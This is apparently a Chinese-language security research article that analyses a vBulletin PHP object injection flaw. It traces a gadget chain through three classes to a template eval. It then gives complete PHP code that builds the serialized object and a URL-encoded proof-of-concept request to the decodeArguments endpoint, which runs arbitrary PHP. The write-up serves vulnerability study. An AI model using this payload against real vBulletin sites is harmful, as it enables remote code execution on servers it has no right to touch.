# ﻿vBulletin PHP对象注入漏洞利用之 __toString

作者：曾鸿坤@安恒安全研究院

## 1. 介绍

此次vBulletinPHP对象注入漏洞，除了_cutz在Pastie上贴出的利用Iterator特性实现远程命令执行外([分析](http://seclab.dbappsecurity.com.cn/?p=544))，[Check Point Research Team](http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/)也发布了另外一种利用姿势，虽然比起前者这个显得有点复杂，但是也有着很多值得我们学习的地方。  

有兴趣的同学可以结合之前的RCE分析一起看：[fd上公布的vBulletin rce 0day分析
](http://seclab.dbappsecurity.com.cn/?p=461)

这个利用共用到3个类，分别为 `vB_vURL`类、`vB_View_AJAXHTML`类（vB_View类的继承类）和`vB5_Template`类。

## 2. 分析

这个首先利用的是`vB_vURL`类。   

### 2.1. vB_vURL类

下面是`vB_vURL`类的析构函数：   

```php
function __destruct()
{
	if (file_exists($this->tmpfile))
	{
		@unlink($this->tmpfile);
	}
}
```

这里显而易见，我们可以通过对象注入，重写`$this->tmpfile`变量，这样就会导致任意文件删除。
   
然而，事实却没有那么简单。   

`file_exists($var)`接收的参数是字符串类型，如果传入的不是String类型变量，将会变量自动转换为String类型。如果传入是个实例化对象，将自动调用对象内的`__toString`函数。相关知识可见：[http://php.net/manual/zh/language.oop5.magic.php#object.tostring](http://php.net/manual/zh/language.oop5.magic.php#object.tostring)   

我们将`$this->tmpfile`覆盖为一个带有`__toString()魔术方法`的对象，那么在执行`file_exists($this->tmpfile)`这一行的时候，将自动执行`$this->tmpfile->__toString()`。  

这时，就要`vB_View_AJAXHTML类` 出场了。


### 2.2. vB_View_AJAXHTML类

`vB_View_AJAXHTML`类是`vB_View`类的继承类。

下面是在`vB_View`类中的__toString方法（这时等同于也在`vB_View_AJAXHTML`类中）：

```php
public function __toString()
{
	try
	{
		return $this->render();
	}
	catch(vB_Exception $e)
	{
		//If debug, return the error, else
		return '';
	}
}
```
在`__toString`方法调用了`render()`方法，下面是`vB_View_AJAXHTML`类中的`render()`方法：

```php
public function render($send_content_headers = false)
{
	...//ignore
	if ($this->content)
	{
		$xml->add_tag('html', $this->content->render());
	}
              ...//ignore
}
```
可以看出，如果`$this->content`为真或者存在，则调用`$this->content`中的`render()`方法。

这时，我们可以通过PHP注入，把`$this->content`变量覆盖为任何一个带有`render()`方法的对象，这样不仅通过了if判断，还能执行`$this->content->render()`。

到这步，我们覆盖`$this->content`是`vB5_Template`类的实例化对象。（`vB5_Template`类中带有`render()`方法）

### 2.3. vB5_Template类

下面是` vB5_Template`类的`render`方法：

```php
public function render($isParentTemplate = true, $isAjaxTemplateRender = false)
{
	...//ignore
	extract(self::$globalRegistered, EXTR_SKIP | EXTR_REFS);
	extract($this->registered, EXTR_OVERWRITE | EXTR_REFS);
	...//ignore
	$templateCache = vB5_Template_Cache::instance();
	$templateCode = $templateCache->getTemplate($this->template);

	if(is_array($templateCode) AND !empty($templateCode['textonly']))
	{
		$final_rendered = $templateCode['placeholder'];
	}
	else if($templateCache->isTemplateText())
	{
		@eval($templateCode);
	}
	...//ignore
}
```

这时首先想到的有两种情况：

1. `$templateCode`变量可控，这样就可以执行任意代码。

2. 跟进`$templateCache->getTemplate()`函数，看看`getTemplate()`函数里是否有可利用的地方。

然而经过分析，两种情况都不存在，但是我们通过控制`$this->template`变量来决定，`$templateCode`加载的是那个模版的代码。

我们可以再通过`extract($this->registered, EXTR_OVERWRITE | EXTR_REFS)`（`$this->registered`变量我们可控），来覆盖模版内的变量。

最后我们用到的是`widget_php`模版。

##2.4. widget_php模版

下面是`widget_php`模版的部分代码：
```php
...//ignore
if (!empty($widgetConfig['code']) AND !vB::getDatastore()->getOption('disable_php_rendering')) {
			$final_rendered .= '
	' . ''; $evaledPHP = vB_Template_Runtime::parseAction('bbcode', 'evalCode', $widgetConfig['code']); $final_rendered .= '' . '
	' . $evaledPHP . '
';
		} else {
	$final_rendered .= '
	' . ''; if ($user['can_use_sitebuilder']) {
			$final_rendered .= '
		<span class="note">' . vB_Template_Runtime::parsePhrase("click_edit_to_config_module") . '</span>
	';
		} else {
	$final_rendered .= '';
...//ignore
```
在这个模版内，将会执行`$widgetConfig['code']`的代码。（类似：`eval($widgetConfig['code'])`）

我们可以直接通过在2.3里的变量覆盖，达到执行任意代码的目的。

## 3.利用

### 3.1.vB5_Template类：

* 覆盖`$this->registered`：用在`extract($this->registered, EXTR_OVERWRITE | EXTR_REFS)`，覆盖模版内的变量（`widget_php`模版内的`$widgetConfig['code']`变量）

* 覆盖`$this->template`：用在`$templateCode = $templateCache->getTemplate($this->template)`，我们要获取`widget_php`模版的代码。

```php
class vB5_Template{
        protected $registered = array();
        protected $template = '';
        public function __construct()
        {
                $this->registered = array("widgetConfig"=>array("code"=>"phpinfo();die();"));
                $this->template = 'widget_php';
        }
}
```

### 3.2.vB_View_AJAXHTML类
* 覆盖`$this->content`： 覆盖为上面我们修改过的`vB5_Template`的实例化对象（new vB5_Template），这样我们才能调用`vB5_Template`内的`render()`方法（`$this->content->render()`）。

```php
class vB_View_AJAXHTML{
        protected $content;
        public function __construct()
        {
                $this->content = new vB5_Template();
        }
}
```

### 3.3.vB_vURL类

* 覆盖`$this->tmpfile`：覆盖为上面我们修改过的`vB_View_AJAXHTML`的实例化对象（new vB_View_AJAXHTML），这样才能调用`vB_View_AJAXHTML`内的`__toString`方法（`file_exists($this->tmpfile)`）。

```php
class vB_vURL{
        var $tmpfile = null;
        public function __construct()
        {
                $this->tmpfile = new vB_View_AJAXHTML();
        }
}
```

### 3.4. 序列化后输出

```php
print '/ajax/api/hook/decodeArguments?arguments=
'.urlencode(serialize(new vB_vURL())) . "\n";
```

### 3.5. POC

```php
/ajax/api/hook/decodeArguments?arguments=
O%3A7%3A%22vB_vURL%22%3A1%3A%7Bs%3A7%3A%22tmpfile%22%3BO%3A16%3A%22vB_View_AJAXHTML%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00content%22%3BO%3A12%3A%22vB5_Template%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00registered%22%3Ba%3A1%3A%7Bs%3A12%3A%22widgetConfig%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22phpinfo%28%29%3Bdie%28%29%3B%22%3B%7D%7Ds%3A11%3A%22%00%2A%00template%22%3Bs%3A10%3A%22widget_php%22%3B%7D%7D%7D
```

## 4.完整代码
```php
<?php
class vB5_Template{
        protected $registered = array();
        protected $template = '';
        public function __construct()
        {
                $this->registered = array("widgetConfig"=>array("code"=>"phpinfo();die();"));
                $this->template = 'widget_php';
        }
}
class vB_View_AJAXHTML{
        protected $content;
        public function __construct()
        {
                $this->content = new vB5_Template();
        }
}
class vB_vURL{
        var $tmpfile = null;
        public function __construct()
        {
                $this->tmpfile = new vB_View_AJAXHTML();
        }
}
print '/ajax/api/hook/decodeArguments?arguments=
'.urlencode(serialize(new vB_vURL())) . "\n";

?>
```
## 5.相关链接：
* http://www.easyaq.org/data/dataLink?id=301
* http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/
* http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq
* http://seclab.dbappsecurity.com.cn/?p=461



